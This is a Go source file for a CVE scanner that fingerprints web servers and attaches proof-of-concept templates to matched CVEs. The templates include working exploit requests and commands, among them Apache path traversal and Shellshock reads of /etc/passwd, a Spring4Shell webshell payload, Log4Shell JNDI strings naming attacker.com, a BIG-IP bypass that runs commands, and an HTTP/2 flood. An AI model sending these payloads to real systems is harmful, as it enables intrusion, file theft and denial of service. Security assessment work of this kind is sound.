package scanner

import (
	"fmt"
	"io"
	"net/http"
	"regexp"
	"sort"
	"strings"
	"time"
)

type CVEDetector struct {
	Target  string
	Client  *http.Client
	Results *CVEReport
}

type CVEReport struct {
	Target    string     `json:"target"`
	ScanTime  time.Time  `json:"scan_time"`
	CVEs      []CVEMatch `json:"cves"`
	RiskScore int        `json:"risk_score"`
	Grade     string     `json:"grade"`
}

type CVEMatch struct {
	CVEID       string     `json:"cve_id"`
	Description string     `json:"description"`
	Severity    string     `json:"severity"`
	CVSS        float64    `json:"cvss"`
	CWE         string     `json:"cwe"`
	Product     string     `json:"product"`
	Version     string     `json:"version"`
	FixedIn     string     `json:"fixed_in"`
	Evidence    string     `json:"evidence,omitempty"`
	Impact      string     `json:"impact"`
	Remediation string     `json:"remediation"`
	PoC         ExploitPoC `json:"poc,omitempty"`
	References  []string   `json:"references,omitempty"`
}

// CVEFinding is an alias for CVEMatch (used in tests)
type CVEFinding = CVEMatch

type ExploitPoC struct {
	Type        string   `json:"type,omitempty"`
	Description string   `json:"description,omitempty"`
	Steps       []string `json:"steps,omitempty"`
	Request     string   `json:"request,omitempty"`
	Script      string   `json:"script,omitempty"`
	Conditions  string   `json:"conditions,omitempty"`
}

type cveSignature struct {
	CVEID       string
	Description string
	Severity    string
	CVSS        float64
	CWE         string
	Product     string
	Version     string
	FixedIn     string
	Impact      string
	Remediation string
	References  []string
	Patterns    []cvePattern
	PoCTemplate ExploitPoC
}

type cvePattern struct {
	Type    string
	Match   string
	Negate  bool
	Version string
	VerNum  string
}

func NewCVEDetector(target string) *CVEDetector {
	return &CVEDetector{
		Target: target,
		Client: &http.Client{
			Timeout: 10 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		Results: &CVEReport{
			Target: target,
			CVEs:   make([]CVEMatch, 0),
		},
	}
}

func (d *CVEDetector) Scan() *CVEReport {
	d.Results.ScanTime = time.Now()
	tech := d.fingerprint()
	for _, sig := range cveDatabase {
		match := d.checkCVE(sig, tech)
		if match != nil {
			match.PoC = d.generatePoC(match)
			d.Results.CVEs = append(d.Results.CVEs, *match)
		}
	}
	d.Results.RiskScore = d.calculateRisk()
	d.Results.Grade = d.scoreToGrade(d.Results.RiskScore)
	sort.Slice(d.Results.CVEs, func(i, j int) bool {
		so := map[string]int{"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
		return so[d.Results.CVEs[i].Severity] < so[d.Results.CVEs[j].Severity]
	})
	return d.Results
}

func (d *CVEDetector) fingerprint() map[string]string {
	tech := make(map[string]string)
	resp, err := sendProbe(d.Target, "GET", "/", nil)
	if err != nil {
		return tech
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 10<<20))
	bodyStr := string(body)
	server := resp.Header.Get("Server")
	poweredBy := resp.Header.Get("X-Powered-By")
	tech["server"] = server
	tech["powered_by"] = poweredBy
	tech["body"] = bodyStr
	if server != "" {
		for _, pat := range []struct{ re, key string }{
			{`(?i)Apache/(\d+\.\d+\.\d+)`, "apache_version"},
			{`(?i)nginx/(\d+\.\d+\.\d+)`, "nginx_version"},
			{`(?i)Microsoft-IIS/(\d+\.\d+)`, "iis_version"},
			{`(?i)Apache-Coyote/(\d+\.\d+)`, "tomcat_version"},
		} {
			re := regexp.MustCompile(pat.re)
			if m := re.FindStringSubmatch(server); len(m) > 1 {
				tech[pat.key] = m[1]
			}
		}
	}
	if poweredBy != "" {
		l := strings.ToLower(poweredBy)
		if strings.Contains(l, "php") {
			tech["php"] = "true"
			re := regexp.MustCompile(`PHP/(\d+\.\d+\.\d+)`)
			if m := re.FindStringSubmatch(poweredBy); len(m) > 1 {
				tech["php_version"] = m[1]
			}
		}
		if strings.Contains(l, "asp.net") {
			tech["aspnet"] = "true"
		}
		if strings.Contains(l, "spring") {
			tech["spring"] = "true"
		}
		if strings.Contains(l, "spring") || strings.Contains(l, "tomcat") || strings.Contains(l, "java") ||
			strings.Contains(l, "jboss") || strings.Contains(l, "glassfish") || strings.Contains(l, "wildfly") ||
			strings.Contains(l, "weblogic") {
			tech["java"] = "true"
		}
	}
	serverLower := strings.ToLower(server)
	if strings.Contains(serverLower, "coyote") || strings.Contains(serverLower, "tomcat") {
		tech["tomcat"] = "true"
		tech["java"] = "true"
	}
	for _, cookie := range resp.Cookies() {
		name := strings.ToLower(cookie.Name)
		if strings.Contains(name, "phpsessid") {
			tech["php"] = "true"
		} else if strings.Contains(name, "jsessionid") {
			tech["java"] = "true"
		} else if strings.Contains(name, "wordpress_") {
			tech["wordpress"] = "true"
		} else if strings.Contains(name, "bigipserver") {
			tech["bigip"] = "true"
		}
	}
	for _, sc := range resp.Header.Values("Set-Cookie") {
		l := strings.ToLower(sc)
		if strings.Contains(l, "jsessionid") {
			tech["java"] = "true"
		}
		if strings.Contains(l, "phpsessid") {
			tech["php"] = "true"
		}
		if strings.Contains(l, "wordpress_logged_in") {
			tech["wordpress"] = "true"
		}
		if strings.Contains(l, "bigipserver") {
			tech["bigip"] = "true"
		}
		if strings.Contains(l, "shirosession") || strings.Contains(l, "rememberme") {
			tech["shiro"] = "true"
		}
	}
	bodyLower := strings.ToLower(bodyStr)
	if strings.Contains(bodyLower, "whitelabel error page") {
		tech["spring"] = "true"
		tech["java"] = "true"
	}
	if strings.Contains(bodyStr, "Drupal") || strings.Contains(bodyStr, "drupal") {
		tech["drupal"] = "true"
	}
	if strings.Contains(bodyStr, "Joomla") || strings.Contains(bodyStr, "joomla") {
		tech["joomla"] = "true"
	}
	if strings.Contains(bodyStr, "GitLab") || strings.Contains(bodyStr, "X-Gitlab") {
		tech["gitlab"] = "true"
	}
	if strings.Contains(bodyStr, "BIG-IP") {
		tech["bigip"] = "true"
	}
	if strings.Contains(bodyLower, "jenkins") {
		tech["jenkins"] = "true"
	}
	if strings.Contains(bodyLower, "struts") {
		tech["struts"] = "true"
	}
	if strings.Contains(bodyLower, "wp-content") {
		tech["wordpress"] = "true"
	}
	metaRe := regexp.MustCompile(`(?i)<meta[^>]*content=\"([^\"]*)\"[^>]*name=\"generator\"[^>]*>`)
	if m := metaRe.FindStringSubmatch(bodyStr); len(m) > 1 {
		g := strings.ToLower(m[1])
		if strings.Contains(g, "drupal") {
			tech["drupal"] = "true"
		}
		if strings.Contains(g, "wordpress") {
			tech["wordpress"] = "true"
		}
		if strings.Contains(g, "joomla") {
			tech["joomla"] = "true"
		}
	}
	metaRe2 := regexp.MustCompile(`(?i)<meta[^>]*name=\"generator\"[^>]*content=\"([^\"]*)\"[^>]*>`)
	if m := metaRe2.FindStringSubmatch(bodyStr); len(m) > 1 {
		g := strings.ToLower(m[1])
		if strings.Contains(g, "drupal") {
			tech["drupal"] = "true"
		}
		if strings.Contains(g, "wordpress") {
			tech["wordpress"] = "true"
		}
		if strings.Contains(g, "joomla") {
			tech["joomla"] = "true"
		}
	}
	tech["proto"] = resp.Proto
	if strings.Contains(resp.Proto, "2") {
		tech["http2"] = "true"
	}
	for key, values := range resp.Header {
		if len(values) == 0 {
			continue
		}
		lk := strings.ToLower(key)
		if strings.Contains(lk, "x-gitlab") {
			tech["gitlab"] = "true"
		}
		if strings.Contains(lk, "x-owa-version") {
			tech["exchange"] = "true"
		}
	}
	return tech
}

func (d *CVEDetector) checkCVE(sig cveSignature, tech map[string]string) *CVEMatch {
	matched := false
	evidence := make([]string, 0)
	for _, pat := range sig.Patterns {
		re, err := regexp.Compile(pat.Match)
		if err != nil {
			continue
		}
		var value string
		switch pat.Type {
		case "header":
			value = tech["server"] + " " + tech["powered_by"]
		case "body":
			value = tech["body"]
		case "server":
			value = tech["server"]
		case "path":
			for key, val := range tech {
				if strings.HasSuffix(key, "_path") && val == "true" {
					matched = true
					evidence = append(evidence, fmt.Sprintf("path:%s", key))
					break
				}
			}
			if matched {
				continue
			}
			value = tech["server"] + " " + tech["body"]
		case "cookie":
			for key, val := range tech {
				if (key == "wordpress" || key == "java" || key == "bigip" || key == "django") && val == "true" {
					matched = true
					evidence = append(evidence, fmt.Sprintf("cookie:%s", key))
				}
			}
			if matched {
				continue
			}
			continue
		case "meta":
			value = tech["body"]
		default:
			value = tech["server"] + " " + tech["body"] + " " + tech["powered_by"]
		}
		if re.MatchString(value) {
			matched = true
			evidence = append(evidence, fmt.Sprintf("%s:%s", pat.Type, pat.Match))
		}
	}
	if !matched {
		return nil
	}
	version := sig.Version
	if v, ok := tech["apache_version"]; ok && strings.Contains(strings.ToLower(sig.Product), "apache") {
		version = v
	}
	return &CVEMatch{
		CVEID: sig.CVEID, Description: sig.Description, Severity: sig.Severity,
		CVSS: sig.CVSS, CWE: sig.CWE, Product: sig.Product, Version: version,
		FixedIn: sig.FixedIn, Evidence: strings.Join(evidence, "; "),
		Impact: sig.Impact, Remediation: sig.Remediation, References: sig.References,
	}
}

func (d *CVEDetector) generatePoC(match *CVEMatch) ExploitPoC {
	for _, sig := range cveDatabase {
		if sig.CVEID == match.CVEID {
			poc := sig.PoCTemplate
			poc.Request = strings.ReplaceAll(poc.Request, "TARGET", d.Target)
			poc.Script = strings.ReplaceAll(poc.Script, "TARGET", d.Target)
			poc.Script = strings.ReplaceAll(poc.Script, "TARGET_HOST", d.Target)
			return poc
		}
	}
	return ExploitPoC{Type: "manual", Description: "No automated PoC available", Conditions: "Manual verification required"}
}

func (d *CVEDetector) calculateRisk() int {
	if len(d.Results.CVEs) == 0 {
		return 0
	}
	severityWeight := map[string]int{"critical": 16, "high": 11, "medium": 6, "low": 2, "info": 1}
	score := 0
	for _, cve := range d.Results.CVEs {
		score += severityWeight[cve.Severity]
		if cve.CVSS >= 10.0 {
			score++
		}
	}
	if score > 100 {
		score = 100
	}
	return score
}

func (d *CVEDetector) scoreToGrade(score int) string {
	switch {
	case score == 0:
		return "A+"
	case score <= 5:
		return "A"
	case score <= 15:
		return "B"
	case score <= 30:
		return "C"
	case score <= 50:
		return "D"
	default:
		return "F"
	}
}

func (d *CVEDetector) Render() string {
	r := d.Results
	var b strings.Builder
	b.WriteString(fmt.Sprintf("\n  CVE SCAN REPORT\n"))
	b.WriteString(fmt.Sprintf("  Target:  %s\n", r.Target))
	b.WriteString(fmt.Sprintf("  Scanned: %s\n", r.ScanTime.Format("2006-01-02 15:04:05")))
	b.WriteString(fmt.Sprintf("  CVEs:    %d found\n", len(r.CVEs)))
	b.WriteString(fmt.Sprintf("  Risk:    %d/100 (Grade: %s)\n", r.RiskScore, r.Grade))
	b.WriteString(strings.Repeat("=", 72) + "\n\n")
	if len(r.CVEs) == 0 {
		b.WriteString("  No known CVEs detected.\n\n")
		return b.String()
	}
	icons := map[string]string{"critical": "[!!!]", "high": "[!!] ", "medium": "[!]  ", "low": "[i]  ", "info": "[.]  "}
	for i, cve := range r.CVEs {
		b.WriteString(fmt.Sprintf("  %s %s  CVSS: %.1f  %s\n", icons[cve.Severity], cve.CVEID, cve.CVSS, strings.ToUpper(cve.Severity)))
		b.WriteString(fmt.Sprintf("     %s\n", cve.Description))
		b.WriteString(fmt.Sprintf("     Product: %s  Version: %s  Fixed: %s\n", cve.Product, cve.Version, cve.FixedIn))
		b.WriteString(fmt.Sprintf("     CWE: %s\n", cve.CWE))
		b.WriteString(fmt.Sprintf("     Evidence: %s\n", cve.Evidence))
		b.WriteString(fmt.Sprintf("     Impact: %s\n", cve.Impact))
		b.WriteString(fmt.Sprintf("     Remediation: %s\n", cve.Remediation))
		if len(cve.References) > 0 {
			b.WriteString("     References:\n")
			for _, ref := range cve.References {
				b.WriteString(fmt.Sprintf("       - %s\n", ref))
			}
		}
		if cve.PoC.Type != "" {
			b.WriteString(fmt.Sprintf("     PoC Type: %s\n", cve.PoC.Type))
			b.WriteString(fmt.Sprintf("     PoC: %s\n", cve.PoC.Description))
			if cve.PoC.Conditions != "" {
				b.WriteString(fmt.Sprintf("     Conditions: %s\n", cve.PoC.Conditions))
			}
			if len(cve.PoC.Steps) > 0 {
				b.WriteString("     Steps:\n")
				for j, s := range cve.PoC.Steps {
					b.WriteString(fmt.Sprintf("       %d. %s\n", j+1, s))
				}
			}
			if cve.PoC.Request != "" {
				b.WriteString("     Raw Request:\n")
				for _, line := range strings.Split(cve.PoC.Request, "\r\n") {
					b.WriteString(fmt.Sprintf("       %s\n", line))
				}
			}
			if cve.PoC.Script != "" {
				b.WriteString("     Script:\n")
				for _, line := range strings.Split(cve.PoC.Script, "\n") {
					b.WriteString(fmt.Sprintf("       %s\n", line))
				}
			}
		}
		if i < len(r.CVEs)-1 {
			b.WriteString("     " + strings.Repeat("-", 60) + "\n\n")
		}
	}
	b.WriteString("\n" + strings.Repeat("=", 72) + "\n")
	b.WriteString(fmt.Sprintf("  Total: %d CVEs  Critical: %d  High: %d  Medium: %d  Low: %d\n",
		len(r.CVEs),
		countBySeverity(r.CVEs, "critical"),
		countBySeverity(r.CVEs, "high"),
		countBySeverity(r.CVEs, "medium"),
		countBySeverity(r.CVEs, "low")))
	b.WriteString(strings.Repeat("=", 72) + "\n\n")
	return b.String()
}

func countBySeverity(cves []CVEMatch, sev string) int {
	count := 0
	for _, c := range cves {
		if c.Severity == sev {
			count++
		}
	}
	return count
}

var cveDatabase = []cveSignature{
	{
		CVEID: "CVE-2021-41773", Description: "Apache HTTP Server Path Traversal", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-22", Product: "Apache httpd", Version: "2.4.49", FixedIn: "2.4.51",
		Impact: "Remote code execution via path traversal", Remediation: "Upgrade Apache to 2.4.51 or later",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-41773"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)apache/2\.4\.4[0-9]`}, {Type: "body", Match: `(?i)apache|httpd`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Apache path traversal via URL encoding",
			Steps:      []string{"Send crafted GET request", "Access /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", "Read sensitive files"},
			Request:    "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Apache 2.4.49 with CGI enabled", Script: "curl -v 'TARGET/cgi-bin/.%%2e/.%%2e/.%%2e/.%%2e/etc/passwd'"},
	},
	{
		CVEID: "CVE-2021-42013", Description: "Apache HTTP Server Path Traversal (bypass)", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-22", Product: "Apache httpd", Version: "2.4.50", FixedIn: "2.4.51",
		Impact: "Bypass of CVE-2021-41773 fix", Remediation: "Upgrade Apache to 2.4.51 or later",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-42013"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)apache/2\.4\.50`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Apache 2.4.50 path traversal bypass",
			Steps: []string{"Send request with double URL encoding"}, Request: "GET /cgi-bin/.%%2e/.%%2e/.%%2e/.%%2e/etc/passwd HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Apache 2.4.50"},
	},
	{
		CVEID: "CVE-2022-22965", Description: "Spring4Shell - Spring Framework RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-94", Product: "Spring Framework", Version: "", FixedIn: "5.3.18",
		Impact: "Remote code execution via classLoader manipulation", Remediation: "Upgrade Spring Framework to 5.3.18+ or 6.0+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-22965"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)apache-coyote|spring|tomcat`}, {Type: "body", Match: `(?i)whitelabel error page`}, {Type: "server", Match: `(?i)Apache-Coyote`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Spring4Shell classLoader RCE",
			Steps:      []string{"Send POST with class.module.classLoader.resources.context.parent.pipeline.first.pattern payload"},
			Request:    "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B",
			Conditions: "JDK 9+ with Tomcat and Spring Framework on WAR deployment"},
	},
	{
		CVEID: "CVE-2021-44228", Description: "Apache Log4j2 Remote Code Execution (Log4Shell)", Severity: "critical",
		CVSS: 10.0, CWE: "CWE-502", Product: "Apache Log4j2", Version: "2.0-beta9 to 2.14.1", FixedIn: "2.15.0",
		Impact: "Remote code execution via JNDI lookup", Remediation: "Upgrade Log4j2 to 2.17.0+ or remove JndiLookup class",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-44228"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)log4j|java|tomcat`}, {Type: "body", Match: `(?i)log4j|error.*jndi`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Log4Shell JNDI injection",
			Steps:      []string{"Inject ${jndi:ldap://attacker.com/a} in User-Agent header", "Trigger JNDI lookup", "Execute arbitrary code"},
			Request:    "GET / HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: ${jndi:ldap://TARGET/a}\r\n\r\n",
			Conditions: "Java application using Log4j2 < 2.15.0", Script: "curl -H 'User-Agent: $\\{jndi:ldap://TARGET/a\\}' TARGET"},
	},
	{
		CVEID: "CVE-2014-6271", Description: "Bash Shellshock Remote Code Execution", Severity: "critical",
		CVSS: 10.0, CWE: "CWE-78", Product: "GNU Bash", Version: "1.14 to 4.3", FixedIn: "4.3 patch 25",
		Impact: "Remote code execution via crafted environment variables", Remediation: "Update Bash to patched version",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2014-6271"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)cgi|apache.*cgi`}, {Type: "path", Match: `(?i)cgi`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Shellshock via CGI User-Agent",
			Steps:      []string{"Send crafted User-Agent with bash function definition", "Execute commands via CGI script"},
			Request:    "GET /cgi-bin/status HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: () { :;}; /bin/cat /etc/passwd\r\n\r\n",
			Conditions: "CGI-enabled Apache with vulnerable Bash", Script: "curl -H 'User-Agent: () { :;}; /bin/cat /etc/passwd' TARGET/cgi-bin/status"},
	},
	{
		CVEID: "CVE-2021-22205", Description: "GitLab Remote Code Execution", Severity: "critical",
		CVSS: 10.0, CWE: "CWE-78", Product: "GitLab", Version: "11.9 to 13.8.8", FixedIn: "13.8.8",
		Impact: "Remote code execution via image upload", Remediation: "Upgrade GitLab to 13.8.8, 13.9.6, or 13.10.3",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-22205"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)x-gitlab`}, {Type: "body", Match: `(?i)gitlab`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "GitLab ExifTool RCE",
			Steps: []string{"Upload crafted image with malicious ExifTool metadata"}, Request: "POST /uploads/user[image] HTTP/1.1\r\nHost: TARGET\r\n\r\n<malicious image>",
			Conditions: "GitLab CE/EE with uploaded images enabled"},
	},
	{
		CVEID: "CVE-2021-34473", Description: "Microsoft Exchange Server ProxyLogon", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-78", Product: "Microsoft Exchange", Version: "2013/2016/2019", FixedIn: "April 2021 CU",
		Impact: "Pre-auth RCE via SSRF", Remediation: "Apply Microsoft security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-34473"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|exchange`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "ProxyLogon SSRF to RCE",
			Steps: []string{"Exploit SSRF to access Exchange backend", "Write webshell"}, Request: "GET /owa/auth/x.js HTTP/1.1\r\nHost: TARGET\r\nCookie: X-AnonResource-Backend=localhost/ecp/default.flt\r\n\r\n",
			Conditions: "Unpatched Microsoft Exchange"},
	},
	{
		CVEID: "CVE-2021-26855", Description: "Microsoft Exchange SSRF (ProxyLogon)", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-918", Product: "Microsoft Exchange", Version: "2013/2016/2019", FixedIn: "March 2021 SU",
		Impact: "Server-side request forgery leading to RCE", Remediation: "Apply Microsoft security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-26855"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|exchange`}, {Type: "header", Match: `(?i)x-owa-version`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "ProxyLogon SSRF",
			Steps:   []string{"Craft request to /owa/auth/x.js with X-AnonResource-Backend cookie"},
			Request: "GET /owa/auth/x.js HTTP/1.1\r\nHost: TARGET\r\n\r\n", Conditions: "Unpatched Exchange"},
	},
	{
		CVEID: "CVE-2020-1472", Description: "Zerologon Netlogon Elevation of Privilege", Severity: "critical",
		CVSS: 10.0, CWE: "CWE-287", Product: "Windows Netlogon", Version: "", FixedIn: "August 2020 CU",
		Impact: "Complete domain compromise", Remediation: "Apply Windows security update and enforce secure channel",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-1472"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|windows`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "Zerologon exploit via Netlogon RPC",
			Steps:  []string{"Use zerologon PoC tool to set machine account password to empty", "Escalate to domain admin"},
			Script: "python zerologon_tester.py TARGET 2>/dev/null", Conditions: "Domain controller with Netlogon enabled"},
	},
	{
		CVEID: "CVE-2023-44487", Description: "HTTP/2 Rapid Reset DDoS", Severity: "high",
		CVSS: 7.5, CWE: "CWE-770", Product: "HTTP/2 implementations", Version: "", FixedIn: "various",
		Impact: "Denial of service via HTTP/2 rapid reset", Remediation: "Update web server/proxy to patched version",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-44487"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)h2|http/2`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "HTTP/2 rapid reset flood",
			Steps: []string{"Open many HTTP/2 streams", "Rapidly reset them"}, Script: "h2load -n 1000000 -c 100 TARGET",
			Conditions: "Server supporting HTTP/2"},
	},
	{
		CVEID: "CVE-2023-34362", Description: "MOVEit Transfer SQL Injection", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-89", Product: "MOVEit Transfer", Version: "before 2021.1.6", FixedIn: "2021.1.6",
		Impact: "SQL injection leading to unauthorized access", Remediation: "Apply Progress MOVEit patch",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-34362"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)moveit|MOVEitTransfer`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "MOVEit SQL injection",
			Steps: []string{"Inject SQL via upload endpoint"}, Request: "POST /api/v1/folders HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "MOVEit Transfer instance"},
	},
	{
		CVEID: "CVE-2023-23397", Description: "Microsoft Outlook Elevation of Privilege", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-522", Product: "Microsoft Outlook", Version: "all versions", FixedIn: "March 2023 SU",
		Impact: "NTLM relay attack via specially crafted email", Remediation: "Apply Outlook security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-23397"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)outlook|exchange`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Requires crafting malicious Outlook appointment",
			Steps: []string{"Create appointment with UNC path in reminder"}, Conditions: "Outlook client reading email"},
	},
	{
		CVEID: "CVE-2022-40684", Description: "FortiOS Authentication Bypass", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-287", Product: "FortiOS", Version: "7.0.0-7.0.3", FixedIn: "7.0.4",
		Impact: "Bypass authentication via forged header", Remediation: "Upgrade FortiOS to 7.0.4+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-40684"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)fortigate|fortiOS`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "FortiOS auth bypass",
			Steps: []string{"Send request with X-Forwarded-For: 127.0.0.1"}, Request: "GET /api/v2/cmdb/system/admin HTTP/1.1\r\nHost: TARGET\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n",
			Conditions: "FortiOS 7.0.0-7.0.3"},
	},
	{
		CVEID: "CVE-2022-1388", Description: "F5 BIG-IP iControl REST Authentication Bypass", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-287", Product: "F5 BIG-IP", Version: "16.1.x", FixedIn: "16.1.2.2",
		Impact: "Bypass authentication to execute commands", Remediation: "Upgrade BIG-IP to patched version",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-1388"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)bigip|big-ip`}, {Type: "cookie", Match: `(?i)bigipserver|BIGipServer`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "BIG-IP auth bypass via connection header",
			Steps:      []string{"Send POST to /mgmt/tm/util/bash with Connection: X-F5-Auth-Token and X-F5-Auth-Token: 0 header"},
			Request:    "POST /mgmt/tm/util/bash HTTP/1.1\r\nHost: TARGET\r\nAuthorization: Basic YWRtaW46\r\nConnection: X-F5-Auth-Token\r\nX-F5-Auth-Token: a\r\n\r\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}",
			Conditions: "BIG-IP with iControl REST exposed"},
	},
	{
		CVEID: "CVE-2021-21972", Description: "VMware vCenter Server RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-22", Product: "VMware vCenter", Version: "<= 7.0 U1", FixedIn: "7.0 U1b",
		Impact: "Remote code execution via vROPS plugin upload", Remediation: "Apply VMware security advisory",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-21972"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)vcenter|vmware`}, {Type: "header", Match: `(?i)vmware`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "vCenter vROPS plugin upload RCE",
			Steps:      []string{"Upload malicious vROPS plugin via /ui/vropspluginui/rest/services/uploadova"},
			Request:    "POST /ui/vropspluginui/rest/services/uploadova HTTP/1.1\r\nHost: TARGET\r\n\r\n<zip file>",
			Conditions: "VMware vCenter exposed to network"},
	},
	{
		CVEID: "CVE-2020-0688", Description: "Microsoft Exchange Validation Key RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-287", Product: "Microsoft Exchange", Version: "2013/2016/2019", FixedIn: "February 2020 SU",
		Impact: "RCE using hardcoded cryptographic key", Remediation: "Apply Exchange security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-0688"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|exchange`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Exchange deserialization RCE",
			Steps:      []string{"Send crafted ViewState payload with known validation key"},
			Request:    "POST /owa/auth/logon.aspx HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Exchange Server with default validation key"},
	},
	{
		CVEID: "CVE-2019-0708", Description: "BlueKeep RDP Remote Code Execution", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-412", Product: "Windows RDP", Version: "Win7/Server 2008", FixedIn: "May 2019 patches",
		Impact: "Wormable RCE via RDP protocol", Remediation: "Apply Windows security patches and disable RDP if not needed",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-0708"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|windows`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "BlueKeep RDP exploit (metasploit module available)",
			Steps:      []string{"Use Metasploit module exploit/windows/rdp/cve_2019_0708_bluekeep_rce"},
			Conditions: "Windows 7 or Server 2008 with RDP enabled"},
	},
	{
		CVEID: "CVE-2018-11776", Description: "Apache Struts2 Remote Code Execution", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-94", Product: "Apache Struts", Version: "2.3-2.3.34", FixedIn: "2.3.35",
		Impact: "Remote code execution via OGNL injection", Remediation: "Upgrade to Struts 2.3.35 or 2.5.17",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2018-11776"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)tomcat|apache`}, {Type: "body", Match: `(?i)struts`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Struts2 OGNL injection",
			Steps: []string{"Inject OGNL expression in URL path"}, Request: "GET /${OGNL}/actionChain1.action HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Struts 2.3-2.3.34 with alwaysSelectFullNamespace"},
	},
	{
		CVEID: "CVE-2017-5638", Description: "Apache Struts2 Jakarta Multipart RCE", Severity: "critical",
		CVSS: 10.0, CWE: "CWE-78", Product: "Apache Struts", Version: "2.3.x-2.5.x", FixedIn: "2.3.32/2.5.10.1",
		Impact: "Remote code execution via Content-Type OGNL injection", Remediation: "Upgrade Struts immediately",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-5638"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)tomcat|struts`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Struts2 Content-Type RCE",
			Steps:      []string{"Send POST with OGNL in Content-Type header"},
			Request:    "POST /upload HTTP/1.1\r\nHost: TARGET\r\nContent-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):(...)}\r\n\r\n",
			Conditions: "Struts2 with Jakarta multipart parser"},
	},
	{
		CVEID: "CVE-2017-12617", Description: "Apache Tomcat PUT Upload RCE", Severity: "high",
